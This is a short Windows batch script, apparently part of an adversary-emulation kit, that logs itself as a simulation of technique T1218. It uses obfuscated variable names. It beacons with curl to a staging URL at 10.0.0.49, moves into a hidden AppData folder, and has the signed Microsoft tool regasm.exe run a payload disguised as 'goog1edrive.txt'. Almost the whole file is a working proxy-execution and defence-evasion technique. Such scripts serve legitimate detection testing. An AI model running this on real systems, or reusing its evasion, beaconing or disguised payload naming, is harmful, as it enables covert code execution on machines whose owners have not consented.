@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET pjkcpgw=%APPDATA%\9740\65921be2
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9740-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=goog1edrive.txt
SET ewjmdkff=9740

SET zxddff=!DATE!/!TIME!
SET qwmnb=%APPDATA%\!pudaazx!\macula-simulations.log

echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!qwmnb!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete=0>> "!qwmnb!" 2>nul

echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!qwmnb!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
if !errorlevel!==0 (
    echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=0>> "!qwmnb!" 2>nul
    SET hkfdtw=1
    SET srfdg=
) else (
    echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=1>> "!qwmnb!" 2>nul
    SET hkfdtw=0
    SET srfdg=chdir_failed
)

echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: regasm_start>> "!qwmnb!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!syjfr!" >nul 2>&1
if !errorlevel!==0 (
    SET xvzkm=1
    SET urdsf=
    echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: regasm_result=0>> "!qwmnb!" 2>nul
) else (
    SET xvzkm=0
    SET urdsf=regasm_failed
    echo [!zxddff!][DEBUG][!hlbnp!][!ewjmdkff!]: regasm_result=1>> "!qwmnb!" 2>nul
)

SET mntpqs=!DATE!
SET bnyhmw=!TIME!
SET mntpqs=!mntpqs:~10,4!-!mntpqs:~4,2!-!mntpqs:~7,2!
SET bnyhmw=!bnyhmw:~0,2!:!bnyhmw:~3,2!:!bnyhmw:~6,2!.!bnyhmw:~9,3!
echo [!mntpqs! !bnyhmw!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed_Binary_Proxy_Execution=!xvzkm!:!urdsf!>> "!qwmnb!" 2>nul